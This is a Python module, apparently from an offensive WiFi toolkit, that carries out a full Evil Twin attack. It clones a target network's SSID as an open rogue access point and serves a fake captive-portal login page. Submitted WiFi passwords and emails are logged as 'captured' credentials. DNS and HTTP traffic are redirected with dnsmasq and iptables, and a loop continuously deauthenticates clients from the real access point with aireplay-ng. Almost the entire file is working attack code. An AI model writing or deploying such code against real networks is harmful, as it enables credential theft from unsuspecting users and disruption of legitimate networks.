"""
Evil Twin Attack Module for ARCH // HUNTER
Rogue AP + Captive Portal + Credential Harvesting
Linux (Kali) only - requires hostapd, dnsmasq, iptables
"""
import subprocess
import threading
import time
import os
import signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from backend.platform_wifi import IS_LINUX, find_tool


PORTAL_DIR = os.path.join(os.path.dirname(__file__), "captive_portal")
ET_INTERFACE_IP = "192.168.4.1"
ET_DHCP_RANGE = "192.168.4.10,192.168.4.250,12h"
ET_SUBNET_MASK = "255.255.255.0"
PORTAL_PORT = 8080


class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for the captive portal."""

    manager = None  # Set by EvilTwinManager before starting server

    def log_message(self, format, *args):
        # Suppress default HTTP logging
        pass

    def do_GET(self, *args, **kwargs):
        # Serve login page for any GET request (captive portal redirect)
        portal_type = self.manager.portal_type if self.manager else "generic"
        template = os.path.join(PORTAL_DIR, f"{portal_type}.html")

        if not os.path.exists(template):
            template = os.path.join(PORTAL_DIR, "generic.html")

        try:
            with open(template, "r") as f:
                html = f.read()
            # Inject target SSID into template
            ssid = self.manager.target_ssid if self.manager else "WiFi"
            html = html.replace("{{SSID}}", ssid)
        except Exception:
            html = "<html><body><h1>Portal Error</h1></body></html>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self, *args, **kwargs):
        # Handle credential submission
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode()
        params = parse_qs(body)

        password = params.get("password", [""])[0]
        email = params.get("email", [""])[0]

        if self.manager and (password or email):
            cred = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "ssid": self.manager.target_ssid,
                "password": password,
                "email": email,
                "client_ip": self.client_address[0]
            }
            self.manager.credentials.append(cred)
            print(f"[EVILTWIN] Credential captured: {cred}")

        # Serve success page
        success_path = os.path.join(PORTAL_DIR, "success.html")
        try:
            with open(success_path, "r") as f:
                html = f.read()
        except Exception:
            html = "<html><body><h1>Connected</h1><p>You are now connected.</p></body></html>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())


class EvilTwinManager:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.running = False
        self.starting = False  # True during start() to block scans
        self.target_ssid = None
        self.target_bssid = None
        self.target_channel = None
        self.portal_type = "generic"
        self.credentials = []

        self.mode = "captive_portal"   # "captive_portal" | "internet_relay"
        self.internet_iface = None      # eth0, usb0 etc. (for internet relay)

        # Process handles
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.portal_server = None
        self.portal_thread = None
        self.deauth_thread = None
        self.deauth_running = False

    def start(self, ssid, bssid, channel, portal_type="generic", mode="captive_portal"):
        """Start Evil Twin attack."""
        if not IS_LINUX:
            return {"status": "error", "message": "Evil Twin only works on Linux (Kali)"}

        if self.running:
            return {"status": "error", "message": "Evil Twin already running"}

        # Check required tools
        for tool in ["hostapd", "dnsmasq", "iptables", "aireplay-ng"]:
            path = find_tool(tool)
            if not path or not os.path.exists(path):
                return {"status": "error", "message": f"Required tool not found: {tool}"}

        self.target_ssid = ssid
        self.target_bssid = bssid
        self.target_channel = channel
        self.portal_type = portal_type
        self.mode = mode
        self.starting = True  # Block scans immediately

        try:
            # Internet relay mode: detect internet interface BEFORE killing NetworkManager
            if self.mode == "internet_relay":
                print("[EVILTWIN] Detecting internet interface (before killing NM)...")
                self.internet_iface = self._detect_internet_interface()
                if not self.internet_iface:
                    self.starting = False
                    return {
                        "status": "error",
                        "message": f"No internet interface found (AP iface: {self.interface}). "
                                   f"Make sure the system has internet via a DIFFERENT interface than the pentest adapter. "
                                   f"Check 'ip route show default' and 'ip addr' on Kali."
                    }
                print(f"[EVILTWIN] Internet interface: {self.internet_iface}")

            # Step 1: Kill interfering processes
            if self.mode == "internet_relay":
                # Internet relay: do NOT kill NetworkManager — internal WiFi needs it for internet
                # But we MUST tell NM to stop managing the AP interface (wlan1)
                print("[EVILTWIN] Step 1: Selective process kill (preserving NetworkManager for internet)...")

                # Tell NetworkManager to unmanage the AP interface
                # This prevents NM from interfering with hostapd
                subprocess.run(
                    ["nmcli", "device", "set", self.interface, "managed", "no"],
                    capture_output=True, timeout=5
                )
                print(f"[EVILTWIN] Set {self.interface} unmanaged by NetworkManager")

                # Kill wpa_supplicant only on the AP interface, not globally
                r = subprocess.run(
                    ["pkill", "-f", f"wpa_supplicant.*{self.interface}"],
                    capture_output=True, timeout=5
                )
                print(f"[EVILTWIN] Killed wpa_supplicant on {self.interface}: rc={r.returncode}")
                # Ensure IP forwarding is enabled
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                               capture_output=True, timeout=5)
            else:
                # Captive portal: kill everything (original behavior)
                print("[EVILTWIN] Step 1: Killing interfering processes...")
                r = subprocess.run(["airmon-ng", "check", "kill"],
                               capture_output=True, text=True, timeout=10)
                print(f"[EVILTWIN] airmon-ng check kill: {r.stdout.strip()}")
            time.sleep(1)

            # Step 2: Setup interface
            print("[EVILTWIN] Step 2: Setting up interface...")
            self._setup_interface()

            # Step 3: Write config files
            print("[EVILTWIN] Step 3: Writing config files...")
            self._write_hostapd_conf()
            self._write_dnsmasq_conf()

            # Read back config for debug
            with open("/tmp/eviltwin_hostapd.conf", "r") as f:
                print(f"[EVILTWIN] hostapd.conf:\n{f.read()}")

            # Step 4: Start hostapd (Rogue AP)
            print("[EVILTWIN] Step 4: Starting hostapd...")
            self._start_hostapd()

            # Step 5: Configure interface IP and routing
            print("[EVILTWIN] Step 5: Setting up network...")
            self._setup_network()

            # Step 6: Start dnsmasq (DHCP + DNS)
            print("[EVILTWIN] Step 6: Starting dnsmasq...")
            self._start_dnsmasq()

            # Step 7: Setup iptables
            print("[EVILTWIN] Step 7: Setting up iptables...")
            self._setup_iptables()

            # Step 8: Start captive portal (only in captive_portal mode)
            if self.mode == "captive_portal":
                print("[EVILTWIN] Step 8: Starting captive portal...")
                self._start_portal()
            else:
                print("[EVILTWIN] Step 8: Skipped (internet relay mode — no portal)")

            # Step 9: Start deauth against real AP
            print("[EVILTWIN] Step 9: Starting deauth...")
            self._start_deauth()

            self.running = True
            self.starting = False
            print(f"[EVILTWIN] Attack started - SSID: {ssid}, Channel: {channel}")
            return {"status": "success", "message": f"Evil Twin started for {ssid}"}

        except Exception as e:
            print(f"[EVILTWIN] Start failed: {e}")
            self.starting = False
            self.stop()
            return {"status": "error", "message": str(e)}

    def stop(self):
        """Stop Evil Twin attack and cleanup."""
        print("[EVILTWIN] Stopping attack...")
        self.running = False
        self.deauth_running = False

        # Kill hostapd
        if self.hostapd_proc:
            try:
                self.hostapd_proc.terminate()
                self.hostapd_proc.wait(timeout=3)
            except Exception:
                try:
                    self.hostapd_proc.kill()
                except Exception:
                    pass
            self.hostapd_proc = None

        # Kill dnsmasq
        if self.dnsmasq_proc:
            try:
                self.dnsmasq_proc.terminate()
                self.dnsmasq_proc.wait(timeout=3)
            except Exception:
                try:
                    self.dnsmasq_proc.kill()
                except Exception:
                    pass
            self.dnsmasq_proc = None
        # Close dnsmasq log file
        if hasattr(self, '_dnsmasq_log_file') and self._dnsmasq_log_file:
            try:
                self._dnsmasq_log_file.close()
            except Exception:
                pass

        # Stop portal server
        if self.portal_server:
            try:
                self.portal_server.shutdown()
            except Exception:
                pass
            self.portal_server = None

        # Kill any leftover processes
        subprocess.run(["pkill", "-f", "hostapd.*eviltwin"],
                       capture_output=True)
        subprocess.run(["pkill", "-f", "dnsmasq.*eviltwin"],
                       capture_output=True)

        # Cleanup iptables
        self._cleanup_iptables()

        # Cleanup temp files
        for f in ["/tmp/eviltwin_hostapd.conf", "/tmp/eviltwin_dnsmasq.conf",
                  "/tmp/eviltwin_dnsmasq.leases"]:
            try:
                os.remove(f)
            except Exception:
                pass

        # Restore deauth interface if used
        if hasattr(self, '_deauth_iface') and self._deauth_iface:
            try:
                subprocess.run(["ip", "link", "set", self._deauth_iface, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", self._deauth_iface, "set", "type", "managed"],
                               capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", self._deauth_iface, "up"],
                               capture_output=True, timeout=5)
            except Exception:
                pass
            self._deauth_iface = None

        # Restore main interface
        try:
            subprocess.run(["ip", "addr", "flush", "dev", self.interface],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", self.interface, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", self.interface, "up"],
                           capture_output=True, timeout=5)
        except Exception:
            pass

        # Restart NetworkManager only if we killed it (captive_portal mode)
        # In internet_relay mode, NM was never stopped — just re-manage the AP interface
        was_relay = self.mode == "internet_relay"
        if not was_relay:
            subprocess.run(["systemctl", "start", "NetworkManager"],
                           capture_output=True, timeout=10)
        else:
            # Give the AP interface back to NetworkManager
            subprocess.run(
                ["nmcli", "device", "set", self.interface, "managed", "yes"],
                capture_output=True, timeout=5
            )
            print("[EVILTWIN] Internet relay mode — re-managed AP interface, NM preserved")

        self.target_ssid = None
        self.target_bssid = None
        self.target_channel = None
        self.mode = "captive_portal"
        self.internet_iface = None
        print("[EVILTWIN] Attack stopped, cleanup done.")
        return {"status": "success", "message": "Evil Twin stopped"}

    def get_status(self):
        """Get current attack status."""
        client_count = 0
        if self.running:
            try:
                # Count connected clients from dnsmasq leases
                lease_file = "/tmp/eviltwin_dnsmasq.leases"
                if os.path.exists(lease_file):
                    with open(lease_file, "r") as f:
                        client_count = len([l for l in f.readlines() if l.strip()])
            except Exception:
                pass

        return {
            "running": self.running,
            "target_ssid": self.target_ssid,
            "target_bssid": self.target_bssid,
            "target_channel": self.target_channel,
            "portal_type": self.portal_type,
            "mode": self.mode,
            "internet_iface": self.internet_iface,
            "client_count": client_count,
            "credential_count": len(self.credentials)
        }

    def get_credentials(self):
        """Return captured credentials."""
        return self.credentials

    def clear_credentials(self):
        """Clear captured credentials."""
        self.credentials = []

    # --- Private methods ---

    def _setup_interface(self):
        """Prepare wireless interface for AP mode."""
        print(f"[EVILTWIN] Setting up interface: {self.interface}")

        # Check if interface exists
        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        print(f"[EVILTWIN] iw dev output:\n{r.stdout}")

        # If interface is in monitor mode (wlan0mon), stop it first
        if "mon" in self.interface:
            orig = self.interface.replace("mon", "")
            print(f"[EVILTWIN] Interface is in monitor mode, stopping: {self.interface} -> {orig}")
            subprocess.run(["airmon-ng", "stop", self.interface],
                           capture_output=True, timeout=10)
            self.interface = orig
            time.sleep(1)

        # Bring interface down and set to managed
        # Do NOT bring it up — hostapd will bring it up itself in AP mode
        r1 = subprocess.run(["ip", "link", "set", self.interface, "down"],
                       capture_output=True, text=True, timeout=5)
        r2 = subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"],
                       capture_output=True, text=True, timeout=5)
        print(f"[EVILTWIN] Interface setup: down={r1.returncode} managed={r2.returncode}")
        if r2.returncode != 0:
            print(f"[EVILTWIN] set managed stderr: {r2.stderr}")

    def _detect_internet_interface(self):
        """Detect the internet-facing interface from default route.
        Can be wired (eth0), USB (usb0), or even another WiFi (wlan0).
        MUST be called BEFORE airmon-ng check kill, since that stops NetworkManager."""
        print(f"[EVILTWIN] Detecting internet iface (AP interface: {self.interface})")

        # Method 1: Parse default route
        default_route_iface = None
        try:
            r = subprocess.run(["ip", "route", "show", "default"],
                               capture_output=True, text=True, timeout=5)
            print(f"[EVILTWIN] ip route output: {r.stdout.strip()}")
            for line in r.stdout.strip().split('\n'):
                if 'default' in line and 'dev' in line:
                    parts = line.split()
                    idx = parts.index('dev')
                    iface = parts[idx + 1]
                    default_route_iface = iface
                    if iface != self.interface:
                        print(f"[EVILTWIN] Found internet interface from default route: {iface}")
                        return iface
                    else:
                        print(f"[EVILTWIN] Default route points to AP interface ({iface}) — skipping, looking for alternatives")
        except Exception as e:
            print(f"[EVILTWIN] Error detecting internet interface: {e}")

        # Method 2: List all interfaces with IP addresses, pick one that isn't the AP interface
        try:
            r = subprocess.run(["ip", "-o", "addr", "show"],
                               capture_output=True, text=True, timeout=5)
            print(f"[EVILTWIN] All interfaces with IPs:\n{r.stdout.strip()}")
            for line in r.stdout.strip().split('\n'):
                parts = line.split()
                if len(parts) >= 4 and "inet " in line:
                    iface = parts[1]
                    if iface != self.interface and iface != "lo":
                        # Skip interfaces without real IPs (169.254.x.x)
                        ip_part = line.split("inet ")[1].split("/")[0] if "inet " in line else ""
                        if ip_part.startswith("169.254") or ip_part.startswith("127."):
                            continue
                        print(f"[EVILTWIN] Found alternative interface with IP: {iface} ({ip_part})")
                        return iface
        except Exception as e:
            print(f"[EVILTWIN] Error listing interfaces: {e}")

        # Method 3: Fallback — check common interface names
        for iface in ["eth0", "usb0", "enp0s3", "ens33", "enp0s25", "eno1",
                       "wlan0", "wlan1", "wlan2", "wlp0s20f3", "wlp1s0"]:
            if os.path.exists(f"/sys/class/net/{iface}") and iface != self.interface:
                try:
                    r = subprocess.run(["ip", "addr", "show", iface],
                                       capture_output=True, text=True, timeout=3)
                    if "inet " in r.stdout and "169.254" not in r.stdout:
                        print(f"[EVILTWIN] Fallback internet interface: {iface}")
                        return iface
                except Exception:
                    pass

        # Nothing found — log detailed diagnostics
        print(f"[EVILTWIN] FAILED to find internet interface!")
        print(f"[EVILTWIN]   AP interface (self.interface): {self.interface}")
        print(f"[EVILTWIN]   Default route interface: {default_route_iface}")
        return None

    def _write_hostapd_conf(self):
        """Write hostapd configuration."""
        conf = f"""interface={self.interface}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.target_channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
        with open("/tmp/eviltwin_hostapd.conf", "w") as f:
            f.write(conf)

    def _write_dnsmasq_conf(self):
        """Write dnsmasq configuration."""
        conf = f"""interface={self.interface}
dhcp-range={ET_DHCP_RANGE}
dhcp-option=3,{ET_INTERFACE_IP}
dhcp-option=6,{ET_INTERFACE_IP}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address={ET_INTERFACE_IP}
dhcp-leasefile=/tmp/eviltwin_dnsmasq.leases
"""
        # Captive portal mode: redirect ALL DNS to portal IP
        # Internet relay mode: let DNS resolve normally (upstream 8.8.8.8)
        if self.mode == "captive_portal":
            conf += f"address=/#/{ET_INTERFACE_IP}\n"

        with open("/tmp/eviltwin_dnsmasq.conf", "w") as f:
            f.write(conf)

    def _setup_network(self):
        """Configure interface IP and enable IP forwarding."""
        # Ensure interface is UP first (hostapd should have brought it up, but be safe)
        subprocess.run(
            ["ip", "link", "set", self.interface, "up"],
            capture_output=True, timeout=5
        )

        # Flush any existing IPs on this interface to avoid conflicts
        subprocess.run(
            ["ip", "addr", "flush", "dev", self.interface],
            capture_output=True, timeout=5
        )

        r = subprocess.run(
            ["ip", "addr", "add", f"{ET_INTERFACE_IP}/24", "dev", self.interface],
            capture_output=True, text=True, timeout=5
        )
        print(f"[EVILTWIN] IP assignment: rc={r.returncode} stderr={r.stderr.strip()}")

        # Verify IP was assigned
        r2 = subprocess.run(
            ["ip", "addr", "show", self.interface],
            capture_output=True, text=True, timeout=5
        )
        if ET_INTERFACE_IP in r2.stdout:
            print(f"[EVILTWIN] IP {ET_INTERFACE_IP} confirmed on {self.interface}")
        else:
            print(f"[EVILTWIN] WARNING: IP not found on {self.interface}!")
            print(f"[EVILTWIN] ip addr output: {r2.stdout.strip()}")

        # Enable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

    def _setup_iptables(self):
        """Setup iptables rules based on mode."""
        iface = self.interface

        if self.mode == "internet_relay" and self.internet_iface:
            # Internet relay: DO NOT flush — that kills Kali's own connection
            # Instead, add only the rules we need (targeted approach)
            inet_iface = self.internet_iface
            print(f"[EVILTWIN] iptables: internet relay mode ({iface} -> {inet_iface})")

            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           capture_output=True, timeout=5)

            # Save current FORWARD policy so we can restore it later
            try:
                r = subprocess.run(["iptables", "-L", "FORWARD", "-n"],
                                   capture_output=True, text=True, timeout=5)
                first_line = r.stdout.strip().split('\n')[0] if r.stdout.strip() else ""
                if "DROP" in first_line:
                    self._orig_forward_policy = "DROP"
                elif "REJECT" in first_line:
                    self._orig_forward_policy = "REJECT"
                else:
                    self._orig_forward_policy = "ACCEPT"
                print(f"[EVILTWIN] Original FORWARD policy: {self._orig_forward_policy}")
            except Exception:
                self._orig_forward_policy = "DROP"

            # Set FORWARD policy to ACCEPT (Kali default is DROP, which blocks NAT)
            subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"],
                           capture_output=True)

            # MASQUERADE outbound traffic from AP through internet iface
            subprocess.run([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", inet_iface, "-j", "MASQUERADE"
            ], capture_output=True)

            # Allow forwarding from AP to internet
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", iface, "-o", inet_iface, "-j", "ACCEPT"
            ], capture_output=True)

            # Allow return traffic
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", inet_iface, "-o", iface,
                "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
            ], capture_output=True)

            # Allow DHCP and DNS from clients to dnsmasq
            subprocess.run([
                "iptables", "-A", "INPUT",
                "-i", iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"
            ], capture_output=True)
            subprocess.run([
                "iptables", "-A", "INPUT",
                "-i", iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"
            ], capture_output=True)

            # Log final state for debug
            r = subprocess.run(["iptables", "-L", "-n", "-v", "--line-numbers"],
                               capture_output=True, text=True, timeout=5)
            print(f"[EVILTWIN] iptables -L:\n{r.stdout[:1000]}")
            r2 = subprocess.run(["iptables", "-t", "nat", "-L", "-n", "-v"],
                                capture_output=True, text=True, timeout=5)
            print(f"[EVILTWIN] iptables nat:\n{r2.stdout[:500]}")

        else:
            # Captive portal: flush + redirect HTTP and DNS to local portal
            # (NM is already killed in captive_portal mode, so flush is safe)
            subprocess.run(["iptables", "--flush"], capture_output=True)
            subprocess.run(["iptables", "--table", "nat", "--flush"], capture_output=True)
            subprocess.run(["iptables", "--delete-chain"], capture_output=True)
            subprocess.run(["iptables", "--table", "nat", "--delete-chain"], capture_output=True)
            print(f"[EVILTWIN] iptables: captive portal mode")

            # Redirect all HTTP traffic to captive portal
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", iface, "-p", "tcp", "--dport", "80",
                "-j", "DNAT", "--to-destination", f"{ET_INTERFACE_IP}:{PORTAL_PORT}"
            ], capture_output=True)

            # Redirect DNS
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", iface, "-p", "udp", "--dport", "53",
                "-j", "DNAT", "--to-destination", f"{ET_INTERFACE_IP}:53"
            ], capture_output=True)

            # Allow established connections
            subprocess.run([
                "iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"
            ], capture_output=True)

    def _cleanup_iptables(self):
        """Remove iptables rules."""
        if self.mode == "internet_relay" and self.internet_iface:
            # Internet relay: remove only the rules we added (don't flush everything)
            iface = self.interface
            inet_iface = self.internet_iface

            subprocess.run([
                "iptables", "-t", "nat", "-D", "POSTROUTING",
                "-o", inet_iface, "-j", "MASQUERADE"
            ], capture_output=True)
            subprocess.run([
                "iptables", "-D", "FORWARD",
                "-i", iface, "-o", inet_iface, "-j", "ACCEPT"
            ], capture_output=True)
            subprocess.run([
                "iptables", "-D", "FORWARD",
                "-i", inet_iface, "-o", iface,
                "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
            ], capture_output=True)
            subprocess.run([
                "iptables", "-D", "INPUT",
                "-i", iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"
            ], capture_output=True)
            subprocess.run([
                "iptables", "-D", "INPUT",
                "-i", iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"
            ], capture_output=True)

            # Restore original FORWARD policy
            orig_policy = getattr(self, '_orig_forward_policy', 'DROP')
            subprocess.run(["iptables", "-P", "FORWARD", orig_policy],
                           capture_output=True)
            print(f"[EVILTWIN] Restored FORWARD policy to {orig_policy}")
        else:
            # Captive portal: flush everything (NM is dead anyway, will restart)
            subprocess.run(["iptables", "--flush"], capture_output=True)
            subprocess.run(["iptables", "--table", "nat", "--flush"], capture_output=True)
            subprocess.run(["iptables", "--delete-chain"], capture_output=True)
            subprocess.run(["iptables", "--table", "nat", "--delete-chain"], capture_output=True)

        # Disable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except Exception:
            pass

    def _start_hostapd(self):
        """Start hostapd process."""
        conf_path = "/tmp/eviltwin_hostapd.conf"

        if not os.path.exists(conf_path):
            raise RuntimeError(f"hostapd config not found: {conf_path}")

        with open(conf_path, "r") as f:
            conf_content = f.read()
        print(f"[EVILTWIN] Config verified ({len(conf_content)} bytes): {conf_path}")

        # Use PIPE + reader thread to capture output without buffering issues
        # A background thread reads stdout so the pipe never fills/breaks
        self._hostapd_output = []
        self._hostapd_ready = threading.Event()

        self.hostapd_proc = subprocess.Popen(
            ["hostapd", "-d", conf_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )

        def _read_hostapd():
            for line in iter(self.hostapd_proc.stdout.readline, b''):
                text = line.decode(errors="replace").rstrip()
                self._hostapd_output.append(text)
                print(f"[HOSTAPD] {text}")
                if "AP-ENABLED" in text:
                    self._hostapd_ready.set()
            # Process exited
            self.hostapd_proc.stdout.close()

        self._hostapd_reader = threading.Thread(target=_read_hostapd, daemon=True)
        self._hostapd_reader.start()

        # Wait up to 8 seconds for AP-ENABLED
        if self._hostapd_ready.wait(timeout=8):
            print("[EVILTWIN] hostapd started successfully - AP-ENABLED detected")
            return

        # AP-ENABLED not seen in output — check if process died
        if self.hostapd_proc.poll() is not None:
            log = "\n".join(self._hostapd_output)
            print(f"[EVILTWIN] hostapd FAILED (exit={self.hostapd_proc.returncode})")
            raise RuntimeError(f"hostapd failed (exit={self.hostapd_proc.returncode}): {log[-500:]}")

        # Process still running but no AP-ENABLED — fallback: check iw
        r = subprocess.run(["iw", "dev", self.interface, "info"],
                           capture_output=True, text=True, timeout=5)
        if "type AP" in r.stdout:
            print("[EVILTWIN] hostapd running - confirmed AP mode via iw")
        else:
            log = "\n".join(self._hostapd_output)
            print(f"[EVILTWIN] WARNING: hostapd running but no AP mode detected")
            print(f"[EVILTWIN] iw output: {r.stdout.strip()}")
            print(f"[EVILTWIN] hostapd output: {log}")

    def _start_dnsmasq(self):
        """Start dnsmasq process."""
        # Kill any existing dnsmasq
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        time.sleep(0.5)

        self._dnsmasq_log_file = open("/tmp/eviltwin_dnsmasq.log", "w")
        self.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", "/tmp/eviltwin_dnsmasq.conf", "-d"],
            stdout=self._dnsmasq_log_file,
            stderr=subprocess.STDOUT
        )
        time.sleep(1)
        if self.dnsmasq_proc.poll() is not None:
            self._dnsmasq_log_file.close()
            try:
                with open("/tmp/eviltwin_dnsmasq.log", "r") as f:
                    log_content = f.read()
                print(f"[EVILTWIN] dnsmasq FAILED - log:\n{log_content}")
                raise RuntimeError(f"dnsmasq failed to start: {log_content[-300:]}")
            except RuntimeError:
                raise
            except Exception as e:
                raise RuntimeError(f"dnsmasq failed to start: {e}")
        print("[EVILTWIN] dnsmasq started")

    def _start_portal(self):
        """Start captive portal HTTP server."""
        CaptivePortalHandler.manager = self

        self.portal_server = HTTPServer(("0.0.0.0", PORTAL_PORT), CaptivePortalHandler)
        self.portal_thread = threading.Thread(target=self.portal_server.serve_forever)
        self.portal_thread.daemon = True
        self.portal_thread.start()
        print(f"[EVILTWIN] Captive portal started on port {PORTAL_PORT}")

    def _start_deauth(self):
        """Start continuous deauth against the real AP."""
        # Skip deauth if no real target (custom SSID mode with no target selected)
        if not self.target_bssid or self.target_bssid == 'FF:FF:FF:FF:FF:FF':
            print("[EVILTWIN] No target BSSID — skipping deauth (custom SSID mode)")
            return

        # Find a second wireless interface for deauth
        # hostapd is using self.interface in AP mode, so we need another one
        self._deauth_iface = self._find_deauth_interface()
        if not self._deauth_iface:
            print("[EVILTWIN] No second wireless interface found — skipping deauth")
            print("[EVILTWIN] (Clients must manually connect to the rogue AP)")
            return

        self.deauth_running = True
        self.deauth_thread = threading.Thread(target=self._deauth_loop)
        self.deauth_thread.daemon = True
        self.deauth_thread.start()
        print(f"[EVILTWIN] Deauth loop started on {self._deauth_iface} against {self.target_bssid}")

    def _find_deauth_interface(self):
        """Find a second wireless interface to use for deauth."""
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            interfaces = []
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line.startswith("Interface "):
                    iface = line.split()[1]
                    # Skip the AP interface (hostapd is using it)
                    if iface == self.interface:
                        continue
                    # Skip the internet interface in relay mode (Kali needs it!)
                    if self.mode == "internet_relay" and iface == self.internet_iface:
                        print(f"[EVILTWIN] Skipping {iface} for deauth — it's the internet uplink")
                        continue
                    interfaces.append(iface)
            if interfaces:
                iface = interfaces[0]
                # Put it in monitor mode
                subprocess.run(["ip", "link", "set", iface, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],
                               capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", iface, "up"],
                               capture_output=True, timeout=5)
                # Set to target channel
                subprocess.run(["iw", "dev", iface, "set", "channel", str(self.target_channel)],
                               capture_output=True, timeout=5)
                return iface
        except Exception as e:
            print(f"[EVILTWIN] Error finding deauth interface: {e}")
        return None

    def _deauth_loop(self):
        """Continuously send deauth packets to the real AP."""
        aireplay = find_tool("aireplay-ng")

        while self.deauth_running and self.running:
            try:
                subprocess.run(
                    [aireplay, "-0", "3", "-a", self.target_bssid, self._deauth_iface],
                    capture_output=True, timeout=10
                )
            except Exception:
                pass
            time.sleep(5)  # Wait between deauth bursts
